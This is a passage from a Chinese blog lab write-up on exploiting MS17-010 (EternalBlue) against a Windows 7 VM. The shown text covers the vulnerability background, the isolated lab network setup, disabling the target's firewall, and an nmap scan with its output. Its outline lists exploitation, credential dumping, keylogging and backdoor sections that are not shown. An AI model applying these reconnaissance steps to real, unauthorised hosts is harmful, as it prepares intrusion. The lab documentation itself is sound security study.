@@ -1,0 +1,996 @@
+<!doctype html><html lang=zh_CN dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="【1】【待续】利用MS17-010攻击Win7"><meta name=keywords content="MS17-010,漏洞,Kali,Win7"><title>【攻防实践】MS17-010漏洞利用</title><link rel=canonical href=http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/><link rel=stylesheet href=/scss/style.min.85f75f3209ee69adac3c94c489274ecc9d07b319e20cd3c86717f7734ee67869.css><meta property='og:title' content="【攻防实践】MS17-010漏洞利用"><meta property='og:description' content="【1】【待续】利用MS17-010攻击Win7"><meta property='og:url' content='http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/'><meta property='og:site_name' content="Lecuo's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='MS17-010'><meta property='article:tag' content='漏洞'><meta property='article:tag' content='Kali'><meta property='article:tag' content='Win7'><meta property='article:published_time' content='2025-12-30T16:23:12+08:00'><meta property='article:modified_time' content='2025-12-30T16:23:12+08:00'><meta property='og:image' content='http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010.png'><meta name=twitter:title content="【攻防实践】MS17-010漏洞利用"><meta name=twitter:description content="【1】【待续】利用MS17-010攻击Win7"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010.png'></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_8cf2f27a1af30ef.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Lecuo's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/leuco-yuu/ target=_blank title=GitHub rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></li><li><a href='https://mail.google.com/mail/u/0/?tf=cm&amp;to=leucoyuu@gmail.com&amp;fs=1' target=_blank title=Gmail rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><polyline points="3,5 12,14 21,5"/></svg></a></li><li><a href='https://wpa.qq.com/msgrd?v=3&amp;uin=1286938728&amp;site=qq&amp;menu=yes/' target=_blank title=QQ rel=me><svg height="32" viewBox="0 0 32 32" width="32"><g fill="none" fill-rule="evenodd"><path d="m15.9998867.0-.3175962.00373031C8.84822.16478688 5.08430177 5.52571032 5.05900841 13.1032973L5.06 13.376l-.86256398 2.1053645c-.34339269.8459887-.59479858 1.4918602-.8236549 2.1249911-.16246446.4494579-.31092035.8862129-.4515632 1.3302912-1.41043336 4.4529342-1.46997142 7.7313526 1.14979123 8.0424546l.19586827.0182568c.69853306.0462522 1.18775172-.1357889 1.69345756-.5695745L6.008 26.385l.10703497.1859114.16295747.2641667L6.368 26.972l-.10203891.0725127c-1.18457469.8599516-1.78515849 2.0422997-.8749963 3.5478041.72014893 1.1919865 1.68579016 1.3851809 4.67654251 1.4059241h1.2781117l.7210113-.0101194c1.4578857-.0287327 2.9764342-.1065736 3.9343697-.2001215l.2555297.0243167c1.1291243.09698 2.8606159.1735357 4.3993902.1859242h1.2781118c2.9907546-.0207471 3.95642-.2139816 4.6768437-1.4064227l.0983227-.1723424c.764361-1.4241985.1648309-2.548721-.9747412-3.3755348L25.631 26.971l.0912293-.1362605.1629318-.2641511L25.992 26.385l.0466679.0427821c.5516504.4732059 1.0836451.6468525 1.8890001.5513616 2.6200145-.3116105 2.5604594-3.5895097 1.1502083-8.0424822-.136678-.4315245-.2810058-.8567817-.4385987-1.2939849l-.1781698-.4846461c-.0923296-.2464665-.1903348-.5013359-.2976536-.7744519l-.3954267-.9868956L26.939 13.376l9399e-7-.279262c-.038761-7.60576089-3.8169423-12.93053326-10.6187985-13.09291824zm1023e-7 2c6.339972 32813e-8 9.0947051 5.25726658 8.9334981 11.7557738l.8516442 2.0748544c.5606846 1.3708665.9939584 2.4718584 1.3860782 3.7098724 1.2134003 3.8314013.8203049 5.4169539.5209683 5.4525554-.6424867.0761796-2.5006035-2.8842697-2.5006035-2.8842697.0 1.7141775-.8994592 3.9510027-2.8457046 5.5664147l.3377045.1073023c1.0249215.341207 2.6653848 1.0302704 2.2154641 1.7750936-.4078113.675007-6.9962271.4309917-8.8982689.2207732l-.4753503.0452169c-2.33636.195172-8.04423656.3608021-8.42291849-.2659901-.50418989-.8339832 1.61195836-1.5976385 2.55205373-1.8820678-1.94652419-1.615412-2.84615056-3.852456-2.84615056-5.5667428l-.32111727.4924567c-.56063792.838483-1.70355568 2.4482423-2.17943051 2.391813-.29933663-.0355468-.69254342-1.6211541.52102408-5.4525554l.21887662-.6654718c.52220361-1.5311231 1.13363576-2.9515889 2.01884579-5.1193097C6.8963095 7.36281332 9.58861109 2.00032813 15.999989 2z" fill="currentColor" fill-rule="nonzero"/></g></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>主页</span></a></li><li><a href=/%E5%8D%9A%E4%B8%BB/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>博主</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>博文</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>搜索</span></a></li><li><a href=/%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ul><li><a href=#实践概览>实践概览</a></li><li><a href=#ms17-010漏洞>MS17-010漏洞</a></li><li><a href=#环境配置>环境配置</a></li><li><a href=#实践步骤>实践步骤</a><ul><li><a href=#隔离网络环境配置与端口扫描>隔离网络环境配置与端口扫描</a><ul><li><a href=#一在-vmware-中创建并分配-lan-区段对-kali-和-win7-执行相同操作>一、在 VMware 中创建并分配 LAN 区段（对 Kali 和 Win7 执行相同操作）：</a></li><li><a href=#二配置-win7-的静态ip并关闭防火墙>二、配置 Win7 的静态IP并关闭防火墙</a></li><li><a href=#三配置kali的静态ip地址并测试二者连通性>三、配置Kali的静态IP地址并测试二者连通性</a></li><li><a href=#四nmap扫描结果分析>四、Nmap扫描结果分析</a></li></ul></li><li><a href=#metasploit扫描与漏洞利用>Metasploit扫描与漏洞利用</a><ul><li><a href=#一启动metasploit框架root>一、启动Metasploit框架（root）：</a></li><li><a href=#二搜索ms17-010模块>二、搜索<code>ms17-010</code>模块：</a></li><li><a href=#三探测目标主机>三、探测目标主机</a></li><li><a href=#四漏洞利用>四、漏洞利用</a></li></ul></li><li><a href=#典型的后渗透攻击行为>典型的“后渗透”攻击行为</a><ul><li><a href=#一凭据窃取>一、凭据窃取</a><ul><li><a href=#1-导出哈希值hashdump>1. 导出哈希值（Hashdump）</a></li><li><a href=#2-抓取内存中的明文密码mimikatz>2. 抓取内存中的明文密码（Mimikatz）</a></li></ul></li><li><a href=#二隐私监控与取证monitoring>二、隐私监控与取证（Monitoring）</a><ul><li><a href=#1实时屏幕截图>1、实时屏幕截图</a></li><li><a href=#2-键盘记录keylogging>2. 键盘记录（Keylogging）</a></li><li><a href=#3-文件窃取与上传>3. 文件窃取与上传</a></li></ul></li><li><a href=#三metasploit持久化后门攻击>三、Metasploit持久化后门攻击</a><ul><li><a href=#利用windows服务机制实现权限维持>利用Windows服务机制实现权限维持</a></li><li><a href=#相关原理>相关原理</a></li></ul></li><li><a href=#四shell>四、Shell</a></li></ul></li></ul></li></ul></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_hu_61fd26a6ecaa680d.png srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_hu_61fd26a6ecaa680d.png 800w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_hu_9e1189f9d58b55eb.png 1600w" width=800 height=419 loading=lazy alt="Featured image of post 【攻防实践】MS17-010漏洞利用"></a></div><div class=article-details><header class=article-category><a href=/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/>网络空间安全
+</a><a href=/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5/>攻防实践</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/>【攻防实践】MS17-010漏洞利用</a></h2><h3 class=article-subtitle>【1】【待续】利用MS17-010攻击Win7</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-12-30T16:23:12+08:00>Dec 30, 2025</time></div></footer></div></header><section class=article-content><h1 id=ms17-010漏洞利用>MS17-010漏洞利用</h1><div class=custom-toc><h3>目录</h3><nav id=TableOfContents><ul><li><a href=#实践概览>实践概览</a></li><li><a href=#ms17-010漏洞>MS17-010漏洞</a></li><li><a href=#环境配置>环境配置</a></li><li><a href=#实践步骤>实践步骤</a><ul><li><a href=#隔离网络环境配置与端口扫描>隔离网络环境配置与端口扫描</a><ul><li><a href=#一在-vmware-中创建并分配-lan-区段对-kali-和-win7-执行相同操作>一、在 VMware 中创建并分配 LAN 区段（对 Kali 和 Win7 执行相同操作）：</a></li><li><a href=#二配置-win7-的静态ip并关闭防火墙>二、配置 Win7 的静态IP并关闭防火墙</a></li><li><a href=#三配置kali的静态ip地址并测试二者连通性>三、配置Kali的静态IP地址并测试二者连通性</a></li><li><a href=#四nmap扫描结果分析>四、Nmap扫描结果分析</a></li></ul></li><li><a href=#metasploit扫描与漏洞利用>Metasploit扫描与漏洞利用</a><ul><li><a href=#一启动metasploit框架root>一、启动Metasploit框架（root）：</a></li><li><a href=#二搜索ms17-010模块>二、搜索<code>ms17-010</code>模块：</a></li><li><a href=#三探测目标主机>三、探测目标主机</a></li><li><a href=#四漏洞利用>四、漏洞利用</a></li></ul></li><li><a href=#典型的后渗透攻击行为>典型的“后渗透”攻击行为</a><ul><li><a href=#一凭据窃取>一、凭据窃取</a><ul><li><a href=#1-导出哈希值hashdump>1. 导出哈希值（Hashdump）</a></li><li><a href=#2-抓取内存中的明文密码mimikatz>2. 抓取内存中的明文密码（Mimikatz）</a></li></ul></li><li><a href=#二隐私监控与取证monitoring>二、隐私监控与取证（Monitoring）</a><ul><li><a href=#1实时屏幕截图>1、实时屏幕截图</a></li><li><a href=#2-键盘记录keylogging>2. 键盘记录（Keylogging）</a></li><li><a href=#3-文件窃取与上传>3. 文件窃取与上传</a></li></ul></li><li><a href=#三metasploit持久化后门攻击>三、Metasploit持久化后门攻击</a><ul><li><a href=#利用windows服务机制实现权限维持>利用Windows服务机制实现权限维持</a></li><li><a href=#相关原理>相关原理</a></li></ul></li><li><a href=#四shell>四、Shell</a></li></ul></li></ul></li></ul></nav></div><h2 id=实践概览>实践概览</h2><ul><li><strong>名称</strong>：MS17-010漏洞利用</li><li><strong>目的</strong>：</li><li><strong>时间</strong>：2025年12月30日</li><li><strong>风险说明</strong>：本实验在完全隔离的虚拟化实验室环境下进行，仅用于教育或授权测试</li></ul><h2 id=ms17-010漏洞>MS17-010漏洞</h2><ul><li><strong>名称</strong>：MS17-010</li><li><strong>别名</strong>：永恒之蓝（EternalBlue）</li><li><strong>公开时间</strong>：2017.3.14（补丁发布）；2017.4.14（攻击工具公开）</li><li><strong>相关CVE</strong>：CVE-2017-0143；CVE-2017-0144；CVE-2017-0145；CVE-2017-0146；CVE-2017-0148 （远程代码执行）；CVE-2017-0147 （信息泄露）</li><li><strong>相关协议</strong>：服务器消息块 1.0 （SMBv1）</li><li><strong>相关端口</strong>：TCP <strong>445</strong>（主要）；<strong>139</strong>（次要）</li><li><strong>漏洞原理</strong>：源于 Windows 内核处理 SMBv1 协议请求的缓冲区溢出。在处理文件扩展属性转换时，系统因错误计算内存大小，导致攻击者可以发送精心构造的数据包，在内核权限下执行任意代码。</li><li><strong>破坏性</strong>：<ul><li><strong>无需用户交互</strong>：攻击者只需向目标主机的445端口发送恶意数据包即可入侵，无需用户点击/打开任何文件</li><li><strong>危害等级高</strong>：成功利用后攻击者可在目标系统上执行任意操作，如安装恶意程序、窃取数据、加密文件（勒索软件）或创建后门</li><li><strong>易于蠕虫化传播</strong>：<strong>WannaCry</strong> 勒索病毒采用的方式，导致其在全球范围内像蠕虫一样自动、快速地蔓延</li></ul></li><li><strong>影响范围</strong>：此漏洞影响当时几乎所有未打补丁的 Windows 版本，主要包括：<ul><li><strong>桌面系统</strong>：Windows XP, Vista, 7, 8, 8.1, Windows 10 (早期版本)</li><li><strong>服务器系统</strong>：Windows Server 2003, 2008, 2008 R2, 2012, 2012 R2, 2016</li></ul></li><li>漏洞修复：安装官方安全补丁——Windows Update 或访问微软官方安全公告手动下载并安装编号为<strong>KB4013389</strong> 的补丁。或手动：<strong>禁用 SMBv1 协议</strong>、<strong>网络层面封堵</strong>、<strong>使用入侵防御系统（IPS）</strong>、<strong>最小化网络暴露</strong></li></ul><h2 id=环境配置>环境配置</h2><ul><li><strong>虚拟环境</strong>：VMware Workstation 17 Pro - 17.0.0 build-20800274</li><li><strong>靶机</strong>：<ul><li><strong>系统</strong>：Windows 7 Enterprise x64</li><li><strong>CPU</strong>：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)</li><li><strong>网络</strong>：LAN（IPv4:10.0.0.17/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）</li></ul></li><li><strong>攻击机</strong>：<ul><li><strong>系统</strong>：Linux kali 6.12.25-amd64</li><li><strong>CPU</strong>：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)</li><li><strong>网络</strong>：LAN（IPv4:10.0.0.223/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）</li></ul></li></ul><h2 id=实践步骤>实践步骤</h2><h3 id=隔离网络环境配置与端口扫描>隔离网络环境配置与端口扫描</h3><h4 id=一在-vmware-中创建并分配-lan-区段对-kali-和-win7-执行相同操作>一、在 VMware 中创建并分配 LAN 区段（对 Kali 和 Win7 执行相同操作）：</h4><p>打开<strong>设置（Setting）</strong> -> 选择<strong>网络适配器（Network Adapter）</strong> -> 右侧点击<strong>LAN区段（LAN Segment）<strong>单选框 -> 点击下方“<strong>LAN区段&mldr;</strong>”按钮 -> 在弹出的窗口中点击</strong>添加（Add）</strong> -> 输入名称**“MS17-010_Experiment”** -> 点击<strong>确定</strong> -> 在<strong>下拉菜单</strong>中选中刚刚创建的LAN区段 -> 点击<strong>确定</strong></p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1.png width=846 height=630 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1_hu_4956252a3246f35d.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1_hu_14038309d84fe612.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=134 data-flex-basis=322px></p><h4 id=二配置-win7-的静态ip并关闭防火墙>二、配置 Win7 的静态IP并关闭防火墙</h4><p>进入Win7 -> 打开<strong>控制面板</strong> -> <strong>网络和 Internet</strong> -> <strong>网络和共享中心</strong> -> <strong>更改适配器设置</strong> -> 右键点击<strong>本地连接</strong> -> <strong>属性</strong> -> 双击<strong>Internet 协议版本4（TCP/IPv4）</strong> -> 选择使用静态IP地址（IP地址：10.0.0.17 | 子网掩码：255.255.255.0 | 默认网关：空） -> 点击<strong>确定</strong>退出 -> 在**“网络与共享中心”<strong>点击</strong>Windows防火墙** -> 选择**“打开或关闭Windows防火墙”** -> 全部关闭（PS：没打补丁不关闭防火墙也能成功）</p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2.png width=796 height=557 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2_hu_6e6b4b24c64e1825.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2_hu_8781c3778f402f07.png 1024w" loading=lazy alt=2 class=gallery-image data-flex-grow=142 data-flex-basis=342px></p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3.png width=797 height=560 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3_hu_4a19f101894a0724.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3_hu_8d39d4cfdd1dde3d.png 1024w" loading=lazy alt=3 class=gallery-image data-flex-grow=142 data-flex-basis=341px></p><h4 id=三配置kali的静态ip地址并测试二者连通性>三、配置Kali的静态IP地址并测试二者连通性</h4><p>打开终端 -> <code>ip addr</code>指令查看网卡名称（通常为<code>eth0</code>） -> 手动分配IP地址：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo systemctl stop NetworkMaager <span class=c1># 关闭NetworkManager服务——Kali 默认运行NetworkManager服务。当手动使用ip命令修改接口状态时，NetworkManager会检测到接口配置发生了变化。如果该接口被它接管，它会根据自己的配置文件（通常是DHCP或“自动连接”）立即重置接口，从而抹掉刚刚手动添加的IP地址</span>
+</span></span><span class=line><span class=cl>sudo ip addr add 10.0.0.223/24 dev eth0 <span class=c1># 将IP地址10.0.0.223分配给eth0网卡</span>
+</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> eth0 up <span class=c1># 激活eth0网卡，让它开始工作</span>
+</span></span></code></pre></td></tr></table></div></div><p>-> 再次输入<code>ip addr</code>验证<code>eth0</code>的IP地址 -> 测试两者连通性并进行Namp扫描：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ping 10.0.0.17 -c <span class=m>4</span> <span class=c1># 只发送4个数据包</span>
+</span></span><span class=line><span class=cl>nmap -n -sV -sC -T4 10.0.0.17 <span class=c1># 不进行DNS解析，使用默认的Nmap脚本探测服务/版本信息</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4.png width=867 height=670 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4_hu_f195f9051ac4a590.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4_hu_1a4fbf30a2c3580b.png 1024w" loading=lazy alt=4 class=gallery-image data-flex-grow=129 data-flex-basis=310px></p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5.png width=862 height=211 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5_hu_bd77efe044127f79.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5_hu_1c57bebc6d421cb9.png 1024w" loading=lazy alt=5 class=gallery-image data-flex-grow=408 data-flex-basis=980px></p><p><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6.png width=867 height=626 srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6_hu_aa79e7e1bdfa8979.png 480w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6_hu_fe78ea29aece5c50.png 1024w" loading=lazy alt=6 class=gallery-image data-flex-grow=138 data-flex-basis=332px></p><h4 id=四nmap扫描结果分析>四、Nmap扫描结果分析</h4><p>上述Nmap扫描结果如下所示：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ nmap -n -sV -sC -T4 10.0.0.17
+</span></span><span class=line><span class=cl>Starting Nmap 7.95 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2025-12-31 02:51 UTC
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.0.0.17
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00047s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>991</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE      VERSION
+</span></span><span class=line><span class=cl>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds Windows <span class=m>7</span> Enterprise <span class=m>7600</span> microsoft-ds <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
+</span></span><span class=line><span class=cl>49152/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>49153/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>49154/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>49155/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>49156/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>49157/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:10:6D:B7 <span class=o>(</span>VMware<span class=o>)</span>
